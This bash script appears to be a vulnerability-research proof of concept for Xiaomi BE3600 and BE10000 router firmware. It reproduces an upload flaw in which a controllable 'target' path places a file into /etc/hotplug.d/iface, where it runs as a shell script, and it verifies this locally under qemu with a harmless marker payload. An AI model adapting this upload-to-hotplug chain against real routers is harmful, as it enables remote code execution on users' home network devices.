#!/usr/bin/env bash
set -euo pipefail

base="${1:-/home/su/xiaomi_rootfs}"
probe_root="/tmp/xiaomi_xqdatacenter_upload_probe"
marker="/tmp/xiaomi_xqdatacenter_hotplug_marker"

rm -rf "$probe_root" "$marker"
mkdir -p "$probe_root/userdisk" "$probe_root/etc/hotplug.d/iface"

payload='echo XIAOMI_XQDATACENTER_HOTPLUG_RCE > /tmp/xiaomi_xqdatacenter_hotplug_marker'
printf '%s\n' "$payload" > "$probe_root/userdisk/upload.tmp"

# Matches luci.controller.api.xqdatacenter.upload:
#   target = formvalue("target")
#   filename = multipart file metadata field "file"
#   rename("/userdisk/upload.tmp", target .. filename)
target="$probe_root/etc/hotplug.d/iface/"
filename="99-xqdatacenter-upload-rce"
mkdir -p "$target"
mv "$probe_root/userdisk/upload.tmp" "$target$filename"

run_case() {
  local name="$1"
  local rootfs="$2"
  local qemu="$3"

  if [[ ! -x "$rootfs/bin/busybox" ]]; then
    printf '[skip] %s busybox missing: %s\n' "$name" "$rootfs/bin/busybox"
    return 0
  fi
  if ! command -v "$qemu" >/dev/null 2>&1; then
    printf '[skip] %s missing emulator: %s\n' "$name" "$qemu"
    return 0
  fi

  rm -f "$marker"
  "$qemu" -L "$rootfs" "$rootfs/bin/busybox" sh -c \
    "for script in $probe_root/etc/hotplug.d/iface/*; do [ -f \"\$script\" ] && . \"\$script\"; done"

  if [[ "$(cat "$marker" 2>/dev/null || true)" == "XIAOMI_XQDATACENTER_HOTPLUG_RCE" ]]; then
    printf '[ok] %s hotplug payload executed via firmware busybox shell\n' "$name"
  else
    printf '[fail] %s marker not created\n' "$name"
    return 1
  fi
}

run_case \
  "BE3600 rn01 1.0.74" \
  "$base/BE3600_miwifi_rn01_firmware_6fbc2_1.0.74/01_ubi_rootfs" \
  qemu-arm

run_case \
  "BE10000 rp04 1.0.89" \
  "$base/BE10000_miwifi_rp04_firmware_76b5c_1.0.89/02_ubi_rootfs" \
  qemu-aarch64

printf 'uploaded_path=%s\n' "$target$filename"
